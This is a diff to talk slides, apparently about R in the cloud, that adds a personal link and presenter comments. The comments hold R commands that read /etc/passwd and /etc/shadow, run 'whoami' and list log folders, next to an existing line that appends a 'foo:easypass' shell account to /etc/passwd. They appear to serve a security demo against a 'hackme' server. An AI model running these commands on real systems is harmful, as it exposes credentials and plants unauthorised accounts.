@@ -60,6 +60,8 @@ document.getElementById("coverslide").remove();
  <img src="img/daroczig.github.io.png" width="55%" class="noborder" />
 </a>
 
+<a href="https://daroczig.github.io">daroczig.github.io</a>
+
 ## $ whoami {data-transition="none-in slide-out"}
 <a href="https://daroczig.github.io/talks" target="_new">
   <img src="img/daroczig.github.io-selection-of-prod-talks-nobg.png" width="55%" class="noborder" />
@@ -69,6 +71,16 @@ document.getElementById("coverslide").remove();
 
 <img src="img/r-cloud-1.jpg" width="80%" class="noborder" />
 
+<!--
+readLines('/etc/passwd')
+
+system('whoami')
+readLines('/etc/shadow')
+
+list.files('/tmp')
+list.files('/var/log')
+-->
+
 ## # cat /etc/passwd
 
 <a href="http://hackme.rapporter.net" target="_new">
@@ -77,6 +89,8 @@ document.getElementById("coverslide").remove();
 
 <!--
 http://54.80.162.109
+
+list.files('/var/log')
 
 cat('foo:easypass:3000:3000::/bin/bash', file = '/etc/passwd', append = TRUE)
 readLines('/etc/passwd')
